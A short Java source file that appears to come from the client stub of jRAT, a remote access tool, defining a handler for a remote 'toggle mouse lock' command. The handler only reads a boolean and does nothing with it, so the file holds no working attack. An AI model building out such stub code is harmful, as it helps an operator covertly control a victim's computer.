package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Screen;

public class Packet27ToggleMouseLock extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean enabled = con.readBoolean();
	}

}
